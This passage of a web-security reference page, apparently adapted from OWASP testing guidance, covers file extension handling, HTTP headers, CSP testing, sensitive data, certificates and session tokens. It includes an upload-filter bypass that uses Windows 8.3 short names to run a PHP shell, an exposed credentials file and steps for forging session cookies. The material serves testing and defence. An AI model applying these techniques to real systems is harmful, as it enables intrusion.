The test URL in this example works like this, as do many web applications. However, if a tester obtains a &ldquo;200&rdquo; response that is not a log in page, it is possible to bypass authentication and thus authorization.</p>

    <sl-details summary="File Extension handling" open>
    <h4>Web servers commonly use file extensions to determine which technologies, languages, and plugins must be used to fulfill web requests. While this behavior is consistent with RFCs and Web Standards, using standard file extensions provides the penetration tester useful information about the underlying technologies used in a web appliance and greatly simplifies the task of determining the attack scenario to be used on particular technologies. In addition, mis-configuration of web servers could easily reveal confidential information about access credentials.</h4>
    <p>File extension checks are often done to validate files before uploading them to the server. Unrestricted file uploads can lead to unforeseen results because the content may not be what is expected, or due to unexpected OS filename handling.</p>
    <p>Understanding how web servers handle requests for files with different extensions can clarify server behavior based on the types of files accessed. For example, it can help to understand which file extensions are returned as text or plain versus those that cause server-side execution. The latter are indicative of technologies, languages, or plugins used by web servers or application servers. This information may provide additional insight into how the web application is engineered. For example, while a &ldquo;.pl&rdquo; extension is typically associated with server-side Perl support, the file extension alone can be misleading and not entirely indicative of the underlying technology. Take, for instance, server-side resources written in Perl, which might be renamed to disguise the usage of Perl. See the next section on &ldquo;web server components&rdquo; for more on identifying server-side technologies and components.</p>

    <h3 id="forced-browsing">Forced Browsing</h3>
    <p>Submit requests with different file extensions and verify how they are handled. The verification should be on a per web directory basis. Verify directories that allow script execution. Web server directories can be identified by scanning tools which look for the presence of well-known directories. Additionally, mirroring the site structure helps testers reconstruct the directory tree served by the application.</p>
    <p>If the web application architecture is load-balanced, it is important to assess all of the web servers. The ease of this task depends on the configuration of the balancing infrastructure. In an infrastructure with redundant components, there may be slight variations in the configuration of individual web or application servers. This may happen if the web architecture employs heterogeneous technologies (think of a set of IIS and Apache web servers in a load-balancing configuration, which may introduce slight asymmetric behavior between them, and possibly different vulnerabilities).</p>
    <h4 id="example">Example</h4>
    <p>The tester has identified the existence of a file named <code class="language-plaintext highlighter-rouge">connection.inc</code>. Trying to access it directly gives back its contents, which are:</p>
    <div class="language-php highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="cp">&lt;?</span>
        <span class="nb">mysql_connect</span><span class="p">(</span><span class="s2">"127.0.0.1"</span><span class="p">,</span> <span class="s2">"root"</span><span class="p">,</span> <span class="s2">"password"</span><span class="p">)</span>
            <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Could not connect"</span><span class="p">);</span>
    <span class="cp">?&gt;</span>
    </code></pre>
    </div>
    </div>
    <p>The tester determines the existence of a MySQL DBMS backend and the weak credentials used by the web application to access it.</p>
    <p>The following file extensions should never be returned by a web server, as they pertain to files that could contain sensitive information or files that have no valid reason to be served.</p>
    <ul>
    <li><code class="language-plaintext highlighter-rouge">.asa</code></li>
    <li><code class="language-plaintext highlighter-rouge">.inc</code></li>
    <li><code class="language-plaintext highlighter-rouge">.config</code></li>
    </ul>
    <p>The following file extensions are related to files which, when accessed, are either displayed or downloaded by the browser. Therefore, files with these extensions must be checked to verify that they are indeed supposed to be served (and are not leftovers), and that they do not contain sensitive information.</p>
    <ul>
    <li><code class="language-plaintext highlighter-rouge">.zip</code>, <code class="language-plaintext highlighter-rouge">.tar</code>, <code class="language-plaintext highlighter-rouge">.gz</code>, <code class="language-plaintext highlighter-rouge">.tgz</code>, <code class="language-plaintext highlighter-rouge">.rar</code>, etc.: (Compressed) archive files</li>
    <li><code class="language-plaintext highlighter-rouge">.java</code>: No reason to provide access to Java source files</li>
    <li><code class="language-plaintext highlighter-rouge">.txt</code>: Text files</li>
    <li><code class="language-plaintext highlighter-rouge">.pdf</code>: PDF documents</li>
    <li><code class="language-plaintext highlighter-rouge">.docx</code>, <code class="language-plaintext highlighter-rouge">.rtf</code>, <code class="language-plaintext highlighter-rouge">.xlsx</code>, <code class="language-plaintext highlighter-rouge">.pptx</code>, etc.: Office documents</li>
    <li><code class="language-plaintext highlighter-rouge">.bak</code>, <code class="language-plaintext highlighter-rouge">.old</code> and other extensions indicative of backup files (for example: <code class="language-plaintext highlighter-rouge">~</code> for Emacs backup files)</li>
    </ul>
    <p>The list given above details only a few examples, since file extensions are too many to be comprehensively treated here. Refer to <a href="https://filext.com/">FILExt</a> for a more thorough database of extensions.</p>
    <p>To identify files with a given extension, a mix of techniques can be employed. These techniques can include using vulnerability scanners, spidering and mirroring tools, and querying search engines (see <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage">Testing: Spidering and googling</a>). Manual inspection of the application can also be beneficial, as it overcomes limitations in automatic spidering. See also <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information">Testing for Old, Backup and Unreferenced Files</a> which deals with the security issues related to &ldquo;forgotten&rdquo; files.</p>
    <h3 id="file-upload">File Upload</h3>
    <p>Windows 8.3 legacy file handling can sometimes be used to defeat file upload filters.</p>
    <p>Usage examples:</p>
    <ol>
    <li><code class="language-plaintext highlighter-rouge">file.phtml</code> gets processed as PHP code.</li>
    <li><code class="language-plaintext highlighter-rouge">FILE~1.PHT</code> is served, but not processed by the PHP ISAPI handler.</li>
    <li><code class="language-plaintext highlighter-rouge">shell.phPWND</code> can be uploaded.</li>
    <li><code class="language-plaintext highlighter-rouge">SHELL~1.PHP</code> will be expanded and returned by the OS shell, then processed by the PHP ISAPI handler.</li>
    </ol>
    <h3 id="gray-box-testing">Gray-Box Testing</h3>
    <p>White-box testing of file extension handling involves checking the server configurations in the web application architecture and verifying the rules for serving different file extensions.</p>
    <p>If the web application relies on a load-balanced, heterogeneous infrastructure, determine whether this may introduce different behavior.</p>

	      <sl-details summary="HTTP Headers" open>
			  <h4>HTTP headers are key-value pairs exchanged between a client (browser) and a server during an HTTP request or response. They convey metadata about the request or response, such as content type, server details, caching policies, and more. Understanding and configuring headers properly is essential for security, performance, and functionality.</h4>

    <h2>Types of HTTP Headers</h2>
    <ul>
        <li><strong>Request Headers:</strong> Sent by the client to provide information about the request.</li>
        <li><strong>Response Headers:</strong> Sent by the server to provide information about the response.</li>
        <li><strong>Entity Headers:</strong> Provide details about the body of the request or response.</li>
        <li><strong>General Headers:</strong> Apply to both request and response messages, such as `Date` and `Connection`.</li>
    </ul>

    <h2>10 Important HTTP Headers</h2>

    <h3>1. Content-Type</h3>
    <p>Indicates the media type of the resource being sent. It helps the client understand how to process the response.</p>
    <p><strong>Example:</strong> <code>Content-Type: application/json</code></p>

    <h3>2. Authorization</h3>
    <p>Contains credentials for authenticating the client with the server. Commonly used with tokens or Basic Auth.</p>
    <p><strong>Example:</strong> <code>Authorization: Bearer &lt;token&gt;</code></p>

    <h3>3. Cache-Control</h3>
    <p>Specifies caching policies for the client or intermediate caches to optimize performance.</p>
    <p><strong>Example:</strong> <code>Cache-Control: no-cache</code></p>

    <h3>4. User-Agent</h3>
    <p>Provides information about the client's software, such as the browser or operating system.</p>
    <p><strong>Example:</strong> <code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)</code></p>

    <h3>5. Set-Cookie</h3>
    <p>Sends cookies from the server to the client, which can store session or tracking data.</p>
    <p><strong>Example:</strong> <code>Set-Cookie: sessionId=abc123; HttpOnly; Secure</code></p>

    <h3>6. Content-Security-Policy (CSP)</h3>
    <p>Enhances security by specifying which resources can be loaded by the browser.</p>
    <p><strong>Example:</strong> <code>Content-Security-Policy: default-src 'self'; img-src 'https://images.example.com'</code></p>

    <h3>7. X-Frame-Options</h3>
    <p>Prevents the webpage from being embedded in an iframe, protecting against clickjacking attacks.</p>
    <p><strong>Example:</strong> <code>X-Frame-Options: SAMEORIGIN</code></p>

    <h3>8. Strict-Transport-Security (HSTS)</h3>
    <p>Forces browsers to use HTTPS for all future requests to a site, ensuring secure communication.</p>
    <p><strong>Example:</strong> <code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code></p>

    <h3>9. Access-Control-Allow-Origin</h3>
    <p>Defines which origins are allowed to access the server's resources. It's essential for CORS (Cross-Origin Resource Sharing).</p>
    <p><strong>Example:</strong> <code>Access-Control-Allow-Origin: *</code></p>

    <h3>10. Accept</h3>
    <p>Specifies the types of media that the client can process. Used to negotiate content types between client and server.</p>
    <p><strong>Example:</strong> <code>Accept: text/html, application/json</code></p>

    <h2>Security Considerations for HTTP Headers</h2>
    <p>Proper configuration of HTTP headers can significantly enhance the security of a web application:</p>
    <ul>
        <li>Use CSP to prevent code injection attacks.</li>
        <li>Enable HSTS to enforce secure HTTPS communication.</li>
        <li>Configure X-Frame-Options to prevent clickjacking attacks.</li>
        <li>Restrict cookies with <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite</code> attributes.</li>
        <li>Use <code>Access-Control-Allow-Origin</code> cautiously to prevent CORS abuse.</li>
    </ul>

    <h2>Testing and Managing HTTP Headers</h2>
    <ul>
        <li><strong>Tools:</strong> Use tools like <a href="https://curl.se/" target="_blank">cURL</a>, <a href="https://httpie.io/" target="_blank">HTTPie</a>, or browser developer tools to analyze HTTP headers.</li>
        <li><strong>Scanners:</strong> Security tools like Burp Suite or OWASP ZAP can test for header-related vulnerabilities.</li>
        <li><strong>Middleware:</strong> Web frameworks like Express.js, Django, or Nginx allow custom configuration of HTTP headers.</li>
    </ul>

      <section id="div-main" class="page-body tab">

  <h4>Content Security Policy (CSP) is a declarative allow-list policy enforced through <code class="language-plaintext highlighter-rouge">Content-Security-Policy</code> response header or equivalent <code class="language-plaintext highlighter-rouge">&lt;meta&gt;</code> element. It allows developers to restrict the sources from which resources such as JavaScript, CSS, images, files etc. are loaded. CSP is an effective defense in depth technique to mitigate the risk of vulnerabilities such as Cross Site Scripting (XSS) and Clickjacking.</h4>
  <p>Content Security Policy supports directives which allow granular control to the flow of policies. (See <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy#references">References</a> for further details.)</p>
  <h2 id="test-objectives">Test Objectives</h2>
  <ul>
  <li>Review the Content-Security-Policy header or meta element to identify misconfigurations.</li>
  </ul>
  <h2 id="how-to-test">How to Test</h2>
  <p>To test for misconfigurations in CSPs, look for insecure configurations by examining the <code class="language-plaintext highlighter-rouge">Content-Security-Policy</code> HTTP response header or CSP <code class="language-plaintext highlighter-rouge">meta</code> element in a proxy tool:</p>
  <ul>
  <li><code class="language-plaintext highlighter-rouge">unsafe-inline</code> directive enables inline scripts or styles, making the applications susceptible to <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting">XSS</a> attacks.</li>
  <li><code class="language-plaintext highlighter-rouge">unsafe-eval</code> directive allows <code class="language-plaintext highlighter-rouge">eval()</code> to be used in the application and is susceptible to common bypass techniques such as data URL injection.</li>
  <li><code class="language-plaintext highlighter-rouge">unsafe-hashes</code> directive allows use of inline scripts/styles, assuming they match the specified hashes.</li>
  <li>Resources such as scripts can be allowed to be loaded from any origin by the use wildcard (<code class="language-plaintext highlighter-rouge">*</code>) source.
  <ul>
  <li>Also consider wildcards based on partial matches, such as: <code class="language-plaintext highlighter-rouge">https://*</code> or <code class="language-plaintext highlighter-rouge">*.cdn.com</code>.</li>
  <li>Consider whether allow listed sources provide JSONP endpoints which might be used to bypass CSP or same-origin-policy.</li>
  </ul>
  </li>
  <li>Framing can be enabled for all origins by the use of the wildcard (<code class="language-plaintext highlighter-rouge">*</code>) source for the <code class="language-plaintext highlighter-rouge">frame-ancestors</code> directive. If the <code class="language-plaintext highlighter-rouge">frame-ancestors</code> directive is not defined in the Content-Security-Policy header it may make applications vulnerable to <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking">clickjacking</a> attacks.</li>
  <li>Business critical applications should require to use a strict policy.</li>
  </ul>
  <h2 id="remediation">Remediation</h2>
  <p>Configure a strong content security policy which reduces the attack surface of the application. Developers can verify the strength of content security policy using online tools such as <a href="https://csp-evaluator.withgoogle.com/">Google CSP Evaluator</a>.</p>
  <h3 id="strict-policy">Strict Policy</h3>
  <p>A strict policy is a policy which provides protection against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.</p>
  <p>Google went ahead and set up a guide to adopt a strict CSP based on nonces. Based on a presentation at <a href="https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation?slide=55">LocoMocoSec</a>, the following two policies can be used to apply a strict policy:</p>
  <p>Moderate Strict Policy:</p>
  <pre><code class="language-HTTP">script-src 'nonce-r4nd0m' 'strict-dynamic';
  object-src 'none'; base-uri 'none';
  </code></pre>
  <p>Locked down Strict Policy:</p>
  <pre><code class="language-HTTP">script-src 'nonce-r4nd0m';
  object-src 'none'; base-uri 'none';
  </code></pre>
  <ul>
  <li><code class="language-plaintext highlighter-rouge">script-src</code> directive is used to restrict the sources from which scripts can be loaded and executed.</li>
  <li><code class="language-plaintext highlighter-rouge">object-src</code> directive is used to restrict the sources from which objects can be loaded and executed.</li>
  <li><code class="language-plaintext highlighter-rouge">base-uri</code> directive specifies the base URL for resolving relative URLs in the page. Without this directive, the page becomes vulnerable to HTML base tag injection attacks.</li>

  <div class="tab-pane fade" id="non-production-data" role="tabpanel" aria-labelledby="non-production-data-tab">
	    <sl-details summary="Non Production data" open>
			<h4>Non-production data refers to data that is used outside the production environment, primarily for development, testing, staging, and training purposes. It serves as a stand-in for real data to help simulate workflows, validate applications, and train models without risking the security or integrity of live production data.</h4>

    <h2>Key Characteristics of Non-Production Data</h2>
    <ul>
        <li><strong>Environment-Specific:</strong> Used in environments like development, testing, staging, and quality assurance (QA).</li>
        <li><strong>Not Live Data:</strong> Does not directly impact the end users or live systems.</li>
        <li><strong>Purpose-Driven:</strong> Created or extracted for debugging, testing, or training purposes.</li>
        <li><strong>May Be Synthetic or Masked:</strong> Often derived from production data but anonymized or generated artificially to protect sensitive information.</li>
    </ul>

    <h2>Common Use Cases for Non-Production Data</h2>
    <ul>
        <li><strong>Development:</strong> Developers use it to build and refine features without the risk of damaging live systems.</li>
        <li><strong>Testing:</strong> Testers use it to verify application behavior under various conditions.</li>
        <li><strong>Staging:</strong> Used in a pre-production environment to simulate real-world scenarios.</li>
        <li><strong>Training:</strong> Data scientists use it to train and validate machine learning models.</li>
        <li><strong>Debugging:</strong> Debugging issues without compromising real user data.</li>
    </ul>

    <h2>Risks Associated with Non-Production Data</h2>
    <ul>
        <li><strong>Using Real Production Data:</strong> If production data is copied into non-production environments without proper anonymization, it can lead to data breaches or compliance violations.</li>
        <li><strong>Lack of Security Controls:</strong> Non-production environments may lack the same level of security controls as production systems.</li>
        <li><strong>Inadequate Data Masking:</strong> Poor masking techniques may still expose sensitive information.</li>
        <li><strong>Data Leakage:</strong> Improper handling can result in leaks to unauthorized users or systems.</li>
        <li><strong>Compliance Violations:</strong> Storing or using personal data in non-production environments may violate data protection regulations like GDPR, HIPAA, or CCPA.</li>
    </ul>

    <h2>Best Practices for Managing Non-Production Data</h2>
    <ol>
        <li><strong>Use Synthetic Data:</strong> Generate fake or synthetic data that resembles production data for development and testing.</li>
        <li><strong>Implement Data Masking:</strong> Anonymize sensitive fields (e.g., names, addresses, account numbers) when using production data in non-production environments.</li>
        <li><strong>Access Controls:</strong> Limit access to non-production environments to authorized personnel only.</li>
        <li><strong>Encrypt Non-Production Data:</strong> Encrypt data in transit and at rest to protect it from unauthorized access.</li>
        <li><strong>Regular Audits:</strong> Periodically audit non-production environments for data security and compliance.</li>
        <li><strong>Environment Separation:</strong> Keep non-production systems isolated from production systems to prevent accidental data crossovers.</li>
    </ol>

    <h2>Benefits of Using Proper Non-Production Data</h2>
    <ul>
        <li><strong>Improved Testing:</strong> Simulate realistic scenarios for accurate application testing.</li>
        <li><strong>Enhanced Security:</strong> Protect sensitive production data from exposure.</li>
        <li><strong>Compliance:</strong> Adhere to legal and regulatory requirements by not exposing personal data.</li>
        <li><strong>Efficiency:</strong> Enable developers and testers to work effectively without compromising data integrity.</li>
    </ul>

    <h2>Example: Data Masking in Non-Production Environments</h2>
    <p>Data masking involves replacing sensitive data with non-sensitive, realistic data for non-production use. For example:</p>
    <pre>
        Production Data: 
        Name: John Doe 
        SSN: 123-45-6789

        Masked Data: 
        Name: Jane Smith 
        SSN: XXX-XX-1234

	    <sl-details summary="Sensitive Data" open>
			<h4>Sensitive data includes any information that must be protected from unauthorized access, especially in the context of software development and application security. This often includes credentials, API keys, tokens, and other secrets used to authenticate or access secure systems and services.</h4>

    <h2>What is Sensitive Data?</h2>
    <p>Sensitive data refers to any confidential information that could compromise the security, privacy, or functionality of a system if exposed. Examples include:</p>
    <ul>
        <li><strong>Credentials:</strong> Usernames and passwords for accessing applications or databases.</li>
        <li><strong>API Keys:</strong> Unique identifiers used to authenticate requests to APIs.</li>
        <li><strong>Tokens:</strong> Session tokens, OAuth tokens, or JWTs used for user authentication and authorization.</li>
        <li><strong>Encryption Keys:</strong> Keys used to encrypt or decrypt data.</li>
        <li><strong>Configuration Secrets:</strong> Database connection strings, cloud storage keys, or other environment-specific data.</li>
    </ul>

    <h2>Risks of Exposed Sensitive Data</h2>
    <ul>
        <li><strong>Unauthorized Access:</strong> Exposed credentials or API keys can allow attackers to gain unauthorized access to systems or data.</li>
        <li><strong>Data Breaches:</strong> Leaking sensitive data can lead to the exposure of user data or internal system details.</li>
        <li><strong>System Compromise:</strong> Attackers can use leaked credentials to modify, delete, or steal data from servers.</li>
        <li><strong>Financial Loss:</strong> Misuse of APIs or cloud services due to exposed API keys can result in financial repercussions.</li>
        <li><strong>Reputation Damage:</strong> Companies face reputational risks when sensitive data is leaked or abused.</li>
    </ul>

    <h2>Examples of Sensitive Data Exposure</h2>
    <ul>
        <li><strong>Hardcoding Secrets:</strong> Embedding credentials or API keys in application source code, especially in public repositories.</li>
        <li><strong>Environment Variables Leak:</strong> Exposing sensitive environment variables due to misconfigurations.</li>
        <li><strong>Improper Logging:</strong> Logging sensitive information like passwords or tokens in application logs.</li>
        <li><strong>Shared Configuration Files:</strong> Sharing configuration files containing secrets without encryption.</li>
    </ul>

    <h2>Best Practices for Securing Sensitive Data</h2>
    <ol>
        <li><strong>Use Environment Variables:</strong> Store sensitive data in environment variables instead of hardcoding them in source code.</li>
        <li><strong>Implement Secret Management Tools:</strong> Use tools like <em>Vault</em>, <em>AWS Secrets Manager</em>, or <em>Azure Key Vault</em> to manage secrets securely.</li>
        <li><strong>Encrypt Sensitive Data:</strong> Encrypt secrets at rest and in transit to prevent unauthorized access.</li>
        <li><strong>Rotate Keys Regularly:</strong> Change credentials, API keys, and tokens periodically to reduce the risk of misuse.</li>
        <li><strong>Restrict Access:</strong> Limit access to sensitive data to only those who need it, using role-based access control (RBAC).</li>
        <li><strong>Audit and Monitor:</strong> Continuously monitor systems for unauthorized access or misuse of sensitive data.</li>
        <li><strong>Avoid Exposing Keys in URLs:</strong> Do not pass API keys or sensitive data in query parameters as they can be logged or intercepted.</li>
        <li><strong>Secure CI/CD Pipelines:</strong> Ensure that sensitive data is not leaked during the build, testing, or deployment processes.</li>
        <li><strong>Review Code for Secrets:</strong> Use tools like <em>git-secrets</em> or <em>TruffleHog</em> to scan codebases for exposed secrets.</li>
    </ol>

    <h2>Tools for Managing Sensitive Data</h2>
    <ul>
        <li><strong>HashiCorp Vault:</strong> A tool for securely storing and accessing secrets.</li>
        <li><strong>AWS Secrets Manager:</strong> Managed service for storing and accessing API keys, passwords, and other secrets.</li>
        <li><strong>GitGuardian:</strong> Monitors Git repositories for leaked secrets.</li>
        <li><strong>TruffleHog:</strong> A tool to detect hardcoded secrets in codebases.</li>
        <li><strong>Azure Key Vault:</strong> Centralized cloud service for storing secrets securely.</li>
    </ul>

    <h2>Real-World Example</h2>
    <p>In 2021, a popular company accidentally leaked their AWS API keys in a public GitHub repository. Attackers exploited this to spin up costly cloud resources, resulting in significant financial losses and reputational damage. This highlights the importance of securing sensitive data.</p>

    <sl-details summary="Certificate" open>
      <h4>A digital certificate is an electronic document used to prove the ownership of a public key. It contains information about the key, the identity of the owner (such as the name or organization), and the digital signature of a trusted entity (the certificate authority) that verifies the authenticity of the information. Digital certificates play a crucial role in securing communications over the internet by enabling encryption, authentication, and data integrity.</h4>

    <h2>What is a Digital Certificate?</h2>
    <p>A digital certificate, also known as a public key certificate, serves as an electronic "passport" that verifies the identity of an entity and provides the public key required for encrypted communication. It is issued by a trusted third party called a Certificate Authority (CA).</p>

    <h2>Components of a Digital Certificate</h2>
    <ul>
        <li><strong>Public Key:</strong> The public key associated with the entity, used for encryption and verifying signatures.</li>
        <li><strong>Identity Information:</strong> Information about the certificate holder (e.g., name, organization, location).</li>
        <li><strong>Certificate Authority (CA) Signature:</strong> A digital signature from a trusted CA that authenticates the certificate holder’s identity and the integrity of the certificate.</li>
        <li><strong>Serial Number:</strong> A unique number assigned to each certificate issued by the CA.</li>
        <li><strong>Expiration Date:</strong> The validity period of the certificate after which it expires and needs to be renewed.</li>
        <li><strong>Issuer Information:</strong> Information about the certificate authority that issued the certificate.</li>
        <li><strong>Signature Algorithm:</strong> The cryptographic algorithm used by the CA to sign the certificate.</li>
    </ul>

    <h2>How Digital Certificates Work</h2>
    <p>Digital certificates are primarily used in the context of Public Key Infrastructure (PKI). Here's a high-level breakdown of how they work:</p>
    <ol>
        <li><strong>Issuance:</strong> A user or organization generates a public/private key pair. The public key is then sent to a CA along with information about the certificate holder.</li>
        <li><strong>Verification:</strong> The CA verifies the information provided and issues a digital certificate containing the public key, identity information, and the CA’s signature.</li>
        <li><strong>Use in Communication:</strong> When two parties want to communicate securely, they exchange digital certificates. The recipient can use the public key to verify the authenticity of the sender and establish a secure communication channel.</li>
        <li><strong>Validation:</strong> A receiver validates the certificate using the CA’s public key, ensuring that the certificate is authentic and hasn’t been tampered with.</li>
        <li><strong>Encryption/Decryption:</strong> The public key is used for encrypting messages, and the corresponding private key is used for decrypting them.</li>
    </ol>

    <h2>Types of Digital Certificates</h2>
    <p>There are several types of digital certificates, each serving a different purpose:</p>
    <ul>
        <li><strong>SSL/TLS Certificates:</strong> Used to secure communication between web servers and clients (browsers). These certificates enable HTTPS connections and ensure that data exchanged is encrypted.</li>
        <li><strong>Code Signing Certificates:</strong> Used by software developers to sign applications and verify that the code hasn’t been altered or tampered with since it was signed.</li>
        <li><strong>Client Certificates:</strong> Used for authenticating clients (users) to a server. These are typically used in mutual TLS authentication to verify both parties.</li>
        <li><strong>Email Certificates (S/MIME):</strong> Used to sign and encrypt email messages, ensuring the integrity and confidentiality of email communications.</li>
        <li><strong>Root Certificates:</strong> The highest level of certificate in a certificate chain, issued by a trusted root certificate authority. Root certificates are used to verify all other certificates in the chain.</li>
        <li><strong>Intermediate Certificates:</strong> Issued by a root certificate authority (CA) and used to establish a chain of trust between the root CA and the server’s certificate.</li>
    </ul>

    <h2>Certificate Authorities (CAs)</h2>
    <p>A Certificate Authority (CA) is a trusted entity responsible for issuing digital certificates. CAs validate the identity of the certificate requestor and ensure the authenticity of the issued certificates. Some well-known CAs include:</p>
    <ul>
        <li><strong>DigiCert</strong></li>
        <li><strong>Comodo</strong></li>
        <li><strong>GlobalSign</strong></li>
        <li><strong>Let’s Encrypt (Free SSL/TLS certificates)</strong></li>
    </ul>

    <h2>Digital Certificate Validation</h2>
    <p>When a digital certificate is presented, it must be validated to ensure it hasn’t been tampered with and is issued by a trusted CA. Validation steps include:</p>
    <ul>
        <li><strong>Chain of Trust:</strong> The certificate must be validated through a chain of trust, starting from the server’s certificate up to a trusted root certificate.</li>
        <li><strong>Expiration Check:</strong> Ensure the certificate is still valid and hasn’t expired.</li>
        <li><strong>Revocation Check:</strong> Check if the certificate has been revoked by the CA (via Certificate Revocation List or OCSP).</li>
        <li><strong>Signature Verification:</strong> Ensure that the CA’s digital signature on the certificate matches the public key of the CA.</li>
    </ul>

    <h2>Benefits of Using Digital Certificates</h2>
    <ul>
        <li><strong>Secure Communication:</strong> Digital certificates ensure encrypted and secure communication over networks, especially on the internet.</li>
        <li><strong>Authentication:</strong> Digital certificates allow both parties in communication to verify each other's identities and reduce the risk of impersonation.</li>
        <li><strong>Data Integrity:</strong> Certificates ensure that data has not been altered during transmission by verifying the authenticity of the sender and the integrity of the message.</li>
        <li><strong>Trust:</strong> By relying on a trusted CA, digital certificates provide a foundation for trust between parties, such as websites and users.</li>

    <!--only over https-->

    <sl-details summary="Credentials only deliver over https" open>
      <h4>To protect sensitive data such as login credentials, API keys, or session tokens, it is essential to ensure that these credentials are delivered only over HTTPS (Hypertext Transfer Protocol Secure). HTTPS provides an encrypted communication channel between the client and the server, preventing eavesdropping and tampering with the data in transit.</h4>

    <h2>Why Use HTTPS for Credentials Delivery?</h2>
    <p>Credentials such as usernames, passwords, API keys, and other sensitive information must be protected from malicious actors during transmission. HTTP transmits data in plaintext, meaning that anyone with access to the network can intercept and read the information. HTTPS, on the other hand, uses encryption through SSL/TLS protocols, providing the following security benefits:</p>
    <ul>
        <li><strong>Encryption:</strong> HTTPS encrypts the data between the client and server, making it unreadable to anyone intercepting the communication.</li>
        <li><strong>Data Integrity:</strong> HTTPS ensures that data is not altered or corrupted during transfer by using cryptographic hashing methods.</li>
        <li><strong>Authentication:</strong> HTTPS verifies that the client is communicating with the legitimate server, preventing man-in-the-middle (MITM) attacks and impersonation of websites.</li>
        <li><strong>Prevention of Eavesdropping:</strong> HTTPS prevents attackers from listening to or intercepting sensitive information like credentials and session tokens.</li>
    </ul>

    <h2>How to Enforce HTTPS for Credential Delivery</h2>
    <p>To ensure that credentials are always transmitted securely, the following measures should be implemented:</p>
    <ul>
        <li><strong>Use Strong SSL/TLS Encryption:</strong> Ensure that the website or service is configured with a valid SSL/TLS certificate. This allows encryption of traffic between clients and servers.</li>
        <li><strong>Redirect HTTP to HTTPS:</strong> Automatically redirect all HTTP requests to HTTPS using a permanent (301) redirect. This prevents users from inadvertently sending data over HTTP.</li>
        <li><strong>Enable HTTP Strict Transport Security (HSTS):</strong> HSTS is a security policy mechanism that forces the browser to communicate with the server only over HTTPS. Once a site implements HSTS, all future requests to that site will automatically use HTTPS.</li>
        <li><strong>Disable SSL/TLS Vulnerabilities:</strong> Ensure that older, insecure versions of SSL/TLS (such as SSL 2.0/3.0) are disabled on the server and only secure protocols like TLS 1.2 or TLS 1.3 are used.</li>
        <li><strong>Use Strong Authentication and Session Management:</strong> In addition to delivering credentials securely over HTTPS, implement strong user authentication and session management practices, such as multi-factor authentication (MFA), to further secure access to sensitive data.</li>
    </ul>

    <h2>Best Practices for Secure Credential Delivery</h2>
    <p>While delivering credentials over HTTPS is essential, it’s also important to follow best practices in handling sensitive information:</p>
    <ul>
        <li><strong>Never store plain-text credentials:</strong> Always hash or encrypt passwords and other sensitive credentials before storing them in a database.</li>
        <li><strong>Limit exposure of credentials:</strong> Use tokens or session identifiers to reduce the exposure of actual login credentials after authentication.</li>
        <li><strong>Use Secure Cookies:</strong> When transmitting credentials or session information through cookies, set the <code>Secure</code> flag to ensure cookies are only sent over HTTPS connections. Also, consider using the <code>HttpOnly</code> and <code>SameSite</code> flags for added security.</li>
        <li><strong>Educate Users:</strong> Encourage users to use strong passwords and enable MFA to enhance the security of their accounts.</li>
        <li><strong>Regularly Review Security Configurations:</strong> Periodically review your server’s SSL/TLS settings and ensure they meet industry standards and are not vulnerable to new exploits.</li>
    </ul>

      <sl-details summary="Session TOken" open>
       
      <h4>One of the core components of any web-based application is the mechanism by which it controls and maintains the state for a user interacting with it. To avoid continuous authentication for each page of a site or service, web applications implement various mechanisms to store and validate credentials for a pre-determined timespan. These mechanisms are known as Session Management.</h4>
      <p>In this test, the tester wants to check that cookies and other session tokens are created in a secure and unpredictable way. An attacker who is able to predict and forge a weak cookie can easily hijack the sessions of legitimate users.</p>
      <p>Cookies are used to implement session management and are described in detail in RFC 2965. In a nutshell, when a user accesses an application which needs to keep track of the actions and identity of that user across multiple requests, a cookie (or cookies) is generated by the server and sent to the client. The client will then send the cookie back to the server in all following connections until the cookie expires or is destroyed. The data stored in the cookie can provide to the server a large spectrum of information about who the user is, what actions he has performed so far, what his preferences are, etc. therefore providing a state to a stateless protocol like HTTP.</p>
      <p>A typical example is provided by an online shopping cart. Throughout the session of a user, the application must keep track of his identity, his profile, the products that he has chosen to buy, the quantity, the individual prices, the discounts, etc. Cookies are an efficient way to store and pass this information back and forth (other methods are URL parameters and hidden fields).</p>
      <p>Due to the importance of the data that they store, cookies are therefore vital in the overall security of the application. Being able to tamper with cookies may result in hijacking the sessions of legitimate users, gaining higher privileges in an active session, and in general influencing the operations of the application in an unauthorized way.</p>
      <p>In this test the tester has to check whether the cookies issued to clients can resist a wide range of attacks aimed to interfere with the sessions of legitimate users and with the application itself. The overall goal is to be able to forge a cookie that will be considered valid by the application and that will provide some kind of unauthorized access (session hijacking, privilege escalation, &hellip;).</p>
      <p>Usually the main steps of the attack pattern are the following:</p>
      <ul>
      <li><strong>cookie collection</strong>: collection of a sufficient number of cookie samples;</li>
      <li><strong>cookie reverse engineering</strong>: analysis of the cookie generation algorithm;</li>
      <li><strong>cookie manipulation</strong>: forging of a valid cookie in order to perform the attack. This last step might require a large number of attempts, depending on how the cookie is created (cookie brute-force attack).</li>
      </ul>
      <p>Another pattern of attack consists of overflowing a cookie. Strictly speaking, this attack has a different nature, since here testers are not trying to recreate a perfectly valid cookie. Instead, the goal is to overflow a memory area, thereby interfering with the correct behavior of the application and possibly injecting (and remotely executing) malicious code.</p>
      <h2 id="test-objectives">Test Objectives</h2>
      <ul>
      <li>Gather session tokens, for the same user and for different users where possible.</li>
